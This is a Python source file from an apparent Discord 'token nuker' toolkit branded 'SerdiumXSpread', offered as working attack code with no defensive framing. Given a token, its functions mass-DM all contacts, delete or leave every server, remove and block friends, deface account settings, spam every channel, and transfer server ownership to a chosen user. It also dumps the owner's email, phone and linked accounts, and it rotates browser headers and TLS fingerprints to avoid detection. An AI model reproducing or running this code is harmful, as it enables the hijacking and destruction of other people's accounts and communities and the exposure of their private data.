from Helper import *
from Helper.Common.utils import *
import Helper

# Token Nuker Functions
def getheaders(token=None):
    """Get random headers for requests"""
    heads = [
        {
            "Content-Type": "application/json",
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
        },
        {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
        },
        {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
        },
        {
            "Content-Type": "application/json",
            'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
        },
        {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
        },
        {
           "Content-Type": "application/json",
           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
    ]
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def massDM(token, content, delay=0.1):
    """Mass DM all friends"""
    color = Helper.color
    new_title("Mass DM")
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            headers=headers,
            data={"content": f"{content}"})
            print(f"{lc} {Fore.BLUE}Id={Fore.WHITE}{channel['id']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}SEND{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
            time.sleep(delay)
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")

def deleteFriends(token):
    """Delete all friends"""
    color = Helper.color
    new_title("Friend Deleter")
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            print(f"{lc} {Fore.BLUE}Friend={Fore.WHITE}{friend['user']['username']}#{friend['user'].get('discriminator', '')}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}REMOVED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")

def deleteServers(token):
    """Delete all servers"""
    color = Helper.color
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    session.keep_alive = True
    new_title("Server Deleter")
    guildsIds = session.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            session.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
            print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}DELETED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")

def close_all_dms(token):
    """Close all DMs"""
    color = Helper.color
    new_title("DM Closer")
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for channel in close_dm_request:
        try:
            print(f"{lc} {Fore.BLUE}ID={Fore.WHITE}{channel['id']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}CLOSED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
            requests.delete(
                f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                headers=headers,)
        except Exception as e:
            print(f"{lc} Error: {e}")

def blockAllFriends(token):
    """Block all friends"""
    color = Helper.color
    new_title("Friend Blocker")
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json_data = {"type": 2}
    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for i in block_friends_request:
        try:
            requests.put(
                f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                headers=headers,
                json=json_data,
            )
            print(f"{lc} {Fore.BLUE}Friend Id={Fore.WHITE}{i['id']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}BLOCKED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} Error: {e}")

def fuckAccount(token):
    """Fuck account settings"""
    color = Helper.color
    new_title("Account Fucker")
    setting = {
        'theme': 'light',
        'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
        'custom_status':{
            'text': 'Fucked by SerdiumXSpread'
        },
        'render_embeds': False,
        'render_reactions': False
    }
    try:
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{lc} {Fore.GREEN}Fucked his Account{Fore.RESET}")
    except Exception as e:
        print(f"{lc} {Fore.RED}Error: {e}{Fore.RESET}")
    time.sleep(2)

def leaveServer(token):
    """Leave all servers"""
    color = Helper.color
    new_title("Leave Server")
    headers = {'Authorization': token}
    try:
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
                print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}LEFT{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
            except Exception as e:
                print(f"{lc} The following error has been encountered and is being ignored: {e}")
    except Exception as e:
        print(f"{lc} Error fetching guilds: {e}")

def Nuke_account(token):
    """Nuke account completely"""
    color = Helper.color
    new_title("Account Nuker")
    print(f"{lc} {Fore.YELLOW}Starting account nuke...{Fore.RESET}")
    massDM(token, "Nuked By SerdiumXSpread")
    close_all_dms(token)
    leaveServer(token)
    deleteServers(token)
    deleteFriends(token)
    fuckAccount(token)
    print(f"{lc} {Fore.GREEN}Account nuked!{Fore.RESET}")

# Status Rotator
def change_status(token, text):
    """Change token status"""
    color = Helper.color
    headers = get_headers(token)
    setting = {
        'custom_status': {
            'text': text,
        },
    }
    r = requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
    if r.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}SUCCESS{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{r.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def read_status_texts(filename):
    """Read status texts from file"""
    with open(filename, 'r', encoding='utf-8') as file:
        status_texts = [line.strip() for line in file.readlines()]
    return status_texts

# Nitro Gift Checker
def time_difference_in_words(date_string):
    """Calculate time difference"""
    try:
        date = datetime.fromisoformat(date_string)
        now = datetime.now(pytz.utc)
        date = date.replace(tzinfo=pytz.utc)
        time_difference = date - now
        seconds = time_difference.total_seconds()
        hours, remainder = divmod(int(seconds), 3600)
        minutes, seconds = divmod(remainder, 60)
        if hours > 0:
            return f"{hours} Hours"
        elif minutes > 0:
            return f"{minutes} Minutes"
        elif seconds > 0:
            return f"{seconds} Seconds"
        else:
            return "Now"
    except ValueError:
        return "Idk Bro"

def check_discord_gift_code(code):
    """Check Discord gift code"""
    color = Helper.color
    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        uses = data.get("uses", 0)
        expiration = f'{data["expires_at"]}'
        time_left = time_difference_in_words(expiration)
        plan = data["subscription_plan"]["name"]
        if uses == 0:
            print((Fore.LIGHTCYAN_EX + time.strftime('[%H:%M:%S] ')) + Fore.LIGHTGREEN_EX + f'Valid' + Fore.WHITE + f' | Link:' + Fore.LIGHTCYAN_EX + f'https://discord.gift/{code}' + Fore.WHITE + f' | Expires:' + Fore.LIGHTCYAN_EX + f'{time_left}' + Fore.WHITE + f' | Type:' + Fore.LIGHTCYAN_EX + plan)
            if not os.path.exists("Output/gift_codes"):
                os.makedirs("Output/gift_codes")
            with open("Output/gift_codes/ValidCodes.txt", "a", encoding='utf-8') as valid_file:
                valid_file.write(f"https://discord.gift/{code}\n")
        else:
            print((Fore.LIGHTCYAN_EX + time.strftime('[%H:%M:%S] ')) + Fore.YELLOW + f'Claimed' + Fore.WHITE + f' | Link:' + Fore.LIGHTCYAN_EX + f'https://discord.gift/{code}')
            if not os.path.exists("Output/gift_codes"):
                os.makedirs("Output/gift_codes")
            with open("Output/gift_codes/UsedGifts.txt", "a", encoding='utf-8') as used_file:
                used_file.write(f"https://discord.gift/{code}\n")
    elif response.status_code == 429:
        print(Fore.CYAN + "Rate Limited | Waiting...")
        time.sleep(3)
        check_discord_gift_code(code)
    elif response.status_code == 404:
        print((Fore.LIGHTCYAN_EX + time.strftime('[%H:%M:%S] ')) +Fore.RED + f'InValid' + Fore.WHITE + f' | Link:' + Fore.LIGHTCYAN_EX + f'https://discord.gift/{code}')
        if not os.path.exists("Output/gift_codes"):
            os.makedirs("Output/gift_codes")
        with open("Output/gift_codes/InvalidCodes.txt", "a", encoding='utf-8') as invalid_file:
            invalid_file.write(f"https://discord.gift/{code}\n")
    else:
        print((Fore.LIGHTCYAN_EX + time.strftime('[%H:%M:%S] ')) +Fore.RED + f'Unknown' + Fore.WHITE + f' | Link:' + Fore.LIGHTCYAN_EX + f'https://discord.gift/{code}')
        if not os.path.exists("Output/gift_codes"):
            os.makedirs("Output/gift_codes")
        with open("Output/gift_codes/UnknownCodes.txt", "a", encoding='utf-8') as unknown_file:
            unknown_file.write(f"https://discord.gift/{code}\n")

# Token Editor Functions
def update_bio(discord_token, new_bio):
    """Update bio"""
    color = Helper.color
    headers = get_headers(discord_token)
    payload = {"bio": f"{new_bio}"}
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    r = session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
    if r.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}BIO CHANGED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{r.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def Change_name(discord_token, new_nickname):
    """Change name"""
    color = Helper.color
    payload = {'global_name': new_nickname}
    headers = get_headers(discord_token)
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    r = session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
    if r.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}NAME CHANGED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{r.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def pronoun_changer(token, nouns):
    """Change pronouns"""
    color = Helper.color
    headerz = get_headers(token)
    payload = {"pronouns":  nouns}
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    r = session.patch("https://discord.com/api/v9/users/@me/profile", json=payload, headers=headerz)
    if r.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}PRONOUN CHANGED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{r.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def get_avatar(path):
    """Get random avatar from path"""
    path2 = os.getcwd()
    picture = [f for f in os.listdir(path2 + f"\\{path}") if isfile(join(path2 + f"\\{path}", f))]
    if not picture:
        return None
    random_picture = random.choice(picture)
    with open(f"{path}\\{random_picture}", "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read())
    return encoded_string.decode('utf-8')

def change_avatar(token, path):
    """Change avatar"""
    color = Helper.color
    avatar_data = get_avatar(path)
    if not avatar_data:
        print(f"{lc} {Fore.RED}No images found in path!{Fore.RESET}")
        return
    session = Session(client_identifier="chrome_122", random_tls_extension_order=True)
    headers = get_headers(token)
    data = {
        "avatar": f"data:image/jpeg;base64,{avatar_data}"
    }
    response = session.patch("https://discord.com/api/v9/users/@me", json=data, headers=headers)
    if response.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}PFP CHANGED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{response.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def Change_lang(discord_token, lang):
    """Change language"""
    color = Helper.color
    payload = {"locale": lang}
    headers = get_headers(discord_token)
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    r = session.patch("https://discord.com/api/v9/users/@me/settings", json=payload, headers=headers)
    if r.status_code == 200:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}LANGUAGE CHANGED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
    else:
        print(f"{lc} {Fore.BLUE}token={Fore.WHITE}{discord_token[:20]}...{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.RED}ERROR{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}({Fore.LIGHTBLACK_EX}{r.status_code}{Style.BRIGHT}{Fore.LIGHTBLACK_EX}){Fore.RESET}")

def process_tokens_editor(target, arg1, tokens=None):
    """Process tokens for editor"""
    color = Helper.color
    if tokens is None:
        tokens = get_tokens()
    tokens = [token.strip() for token in tokens if token.strip()]
    if not tokens:
        print(f"{ld} {Fore.RED}No tokens to process!{Fore.RESET}")
        return
    threads = []
    for token in tokens:
        token = token.strip()
        thread = threading.Thread(target=target, args=(token, arg1))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

# Token Info
def fetch_user_details(token):
    """Fetch user details from token"""
    color = Helper.color
    new_title("Token Info")
    headers = {
        'Authorization': token
    }
    user_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if user_response.status_code != 200:
        print(Fore.RED + "Failed to fetch user details. Make sure the token is correct." + Style.RESET_ALL)
        return
    user_data = user_response.json()
    created_at = datetime.utcfromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000)
    print(Fore.GREEN + "User Details:" + Style.RESET_ALL)
    print(f"{Fore.CYAN}Token:{Style.RESET_ALL} {token}")
    print(f"{Fore.CYAN}ID:{Style.RESET_ALL} {user_data['id']}")
    print(f"{Fore.CYAN}Username:{Style.RESET_ALL} {user_data['username']}")
    print(f"{Fore.CYAN}Discriminator:{Style.RESET_ALL} {user_data.get('discriminator', 'N/A')}")
    print(f"{Fore.CYAN}Avatar URL:{Style.RESET_ALL} https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data.get('avatar', '')}.png")
    print(f"{Fore.CYAN}Locale:{Style.RESET_ALL} {user_data.get('locale', 'N/A')}")
    print(f"{Fore.CYAN}Email:{Style.RESET_ALL} {user_data.get('email', 'Not available')}")
    print(f"{Fore.CYAN}Phone:{Style.RESET_ALL} {user_data.get('phone', 'Not available')}")
    print(f"{Fore.CYAN}Account Creation Date:{Style.RESET_ALL} {created_at}")
    connections_response = requests.get('https://discord.com/api/v9/users/@me/connections', headers=headers)
    if connections_response.status_code == 200:
        connections_data = connections_response.json()
        if connections_data:
            print("\nConnected Accounts:")
            for connection in connections_data:
                print(f"{Fore.CYAN}Type:{Style.RESET_ALL} {connection['type']}")
                print(f"{Fore.CYAN}Name:{Style.RESET_ALL} {connection['name']}")
                print(f"{Fore.CYAN}ID:{Style.RESET_ALL} {connection['id']}\n")
        else:
            print("No connected accounts.")
    else:
        print("Failed to fetch connected accounts.")
    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if guilds_response.status_code == 200:
        guilds_data = guilds_response.json()
        guild_count = len(guilds_data)
        owner_guilds = [guild for guild in guilds_data if guild.get('owner', False)]
        owner_guild_count = len(owner_guilds)
        print(f"{Fore.GREEN}\nGuild Count:{Style.RESET_ALL} {guild_count}")
        print(f"{Fore.GREEN}Owner Guild Count:{Style.RESET_ALL} {owner_guild_count}")
        if owner_guilds:
            print("\nOwner Guilds:")
            for guild in owner_guilds:
                print(f"{Fore.CYAN}Name:{Style.RESET_ALL} {guild['name']} {Fore.CYAN}(ID:{Style.RESET_ALL} {guild['id']})")
    else:
        print("Failed to fetch guilds.")
    input("Press Enter To continue...")

# Token Onliner
types = ['Playing', 'Streaming', 'Watching', 'Listening']
status_types = ['online', 'dnd', 'idle']
GAME = "SerdiumXSpread"
type_ = types[0]
status_type = status_types[0]
random_ = True
stream_text = "SerdiumXSpread"

def online(token, game, type, status):
    """Make token appear online"""
    global c
    color = Helper.color
    tokens = get_tokens()
    tokens = [token.strip() for token in tokens]
    l = len(tokens)
    if random_:
        type = random.choice(['Playing', 'Streaming', 'Watching', 'Listening', ''])
        status = random.choice(['online', 'dnd', 'idle'])
        ws = websocket.WebSocket()
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        hello = json.loads(ws.recv())
        heartbeat_interval = hello['d']['heartbeat_interval']
        if type == "Playing":
            game = random.choice(["Minecraft", "Badlion", "Roblox", "The Elder Scrolls: Online", "DCS World Steam Edit"])
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": stream_text
            }
        elif type == "Listening":
            game = random.choice(["Spotify", "Deezer", "Apple Music", "YouTube", "SoundCloud"])
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            game = random.choice(["YouTube", "Twitch"])
            gamejson = {
                "name": game,
                "type": 3
            }
        else:
            gamejson = {
                "name": game,
                "type": 0
            }
        auth = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "RTB",
                    "$device": f"{sys.platform} Device"
                },
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": 0,
                    "afk": False
                }
            },
            "s": None,
            "t": None
        }
        ws.send(json.dumps(auth))
        ack = {
            "op": 1,
            "d": None
        }
        c = 0
        while True:
            time.sleep(heartbeat_interval / 1000)
            try:
                c += 1
                print(f"{Fore.GREEN}[i] {token[:20]}... is online {c}/{l}")
                ws.send(json.dumps(ack))
            except Exception as e:
                print(f"[!] Error: " + str(e))
                break

def online_tokens():
    """Make all tokens appear online"""
    color = Helper.color
    new_title("Token Onliner")
    threads = []
    tokens = get_tokens()
    tokens = [token.strip() for token in tokens]
    print(f"{lc} Starting...")
    for token in tokens:
        thread = threading.Thread(target=online, args=(token, GAME, type_, status_type))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    print(f"{ld} {Fore.GREEN}Tokens are online{Fore.RESET}")
    input("")

async def mtsv1_spam_everywhere(token, message, exclude_group_dms, delay):
    """MTSV1 - Send message to all DMs and all server channels"""
    color = Helper.color
    headers = {'Authorization': token}
    
    # Get all DMs
    try:
        dm_channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        dm_count = 0
        for channel in dm_channels:
            # Check if it's a group DM (type 3) and if we should exclude it
            if exclude_group_dms and channel.get('type') == 3:
                continue
            
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
                             headers=headers,
                             json={"content": message})
                print(f"{lc} {Fore.BLUE}DM={Fore.WHITE}{channel.get('id', 'unknown')}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}SENT{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                dm_count += 1
                await asyncio.sleep(delay)
            except Exception as e:
                print(f"{lc} {Fore.RED}Failed to send DM: {e}{Fore.RESET}")
    except Exception as e:
        print(f"{lc} {Fore.RED}Failed to fetch DMs: {e}{Fore.RESET}")
    
    # Get all servers and send to all channels
    try:
        url = 'https://discord.com/api/v9/users/@me/guilds'
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status != 200:
                    print(f"{ld} {Fore.RED}Failed to fetch guilds{Fore.RESET}")
                    return
                guilds = await response.json()
                channel_count = 0
                for guild in guilds:
                    guild_id = guild['id']
                    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as channels_response:
                        if channels_response.status != 200:
                            continue
                        channels = await channels_response.json()
                        for channel in channels:
                            channel_id = channel['id']
                            channel_type = channel.get('type', 0)
                            if channel_type != 0:  # Only text channels
                                continue
                            try:
                                async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                                                       headers=headers,
                                                       json={"content": message}) as msg_response:
                                    if msg_response.status == 200:
                                        print(f"{lc} {Fore.BLUE}Channel={Fore.WHITE}{channel_id}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}SENT{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                                        channel_count += 1
                                    await asyncio.sleep(delay)
                            except Exception as e:
                                pass
        print(f"\n{ld} {Fore.GREEN}MTSV1 Complete!{Fore.RESET}")
        print(f"{ld} {Fore.CYAN}DMs sent: {dm_count}{Fore.RESET}")
        print(f"{ld} {Fore.CYAN}Channels sent: {channel_count}{Fore.RESET}")
    except Exception as e:
        print(f"{lc} {Fore.RED}Error in MTSV1: {e}{Fore.RESET}")

def transfer_ownership_all_servers(token, new_owner_id):
    """Transfer ownership of all servers to a specific user ID"""
    color = Helper.color
    new_title("Transfer Ownership")
    headers = getheaders(token)
    
    try:
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        transferred = 0
        failed = 0
        
        for guild in guilds:
            guild_id = guild['id']
            guild_name = guild.get('name', 'Unknown')
            
            try:
                # Transfer ownership
                response = requests.patch(
                    f'https://discord.com/api/v9/guilds/{guild_id}',
                    headers=headers,
                    json={"owner_id": new_owner_id}
                )
                
                if response.status_code == 200:
                    print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild_name} ({guild_id}){Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}OWNERSHIP TRANSFERRED{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                    transferred += 1
                else:
                    print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild_name} ({guild_id}){Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.RED}FAILED: {response.status_code}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                    failed += 1
                    if response.status_code == 403:
                        print(f"{ld} {Fore.YELLOW}You may not have permission to transfer this server{Fore.RESET}")
                
                time.sleep(0.5)  # Rate limit protection
            except Exception as e:
                print(f"{lc} {Fore.RED}Error transferring {guild_name}: {e}{Fore.RESET}")
                failed += 1
        
        print(f"\n{ld} {Fore.GREEN}Transfer Complete!{Fore.RESET}")
        print(f"{ld} {Fore.CYAN}Transferred: {transferred}{Fore.RESET}")
        print(f"{ld} {Fore.RED}Failed: {failed}{Fore.RESET}")
    except Exception as e:
        print(f"{lc} {Fore.RED}Failed to fetch guilds: {e}{Fore.RESET}")

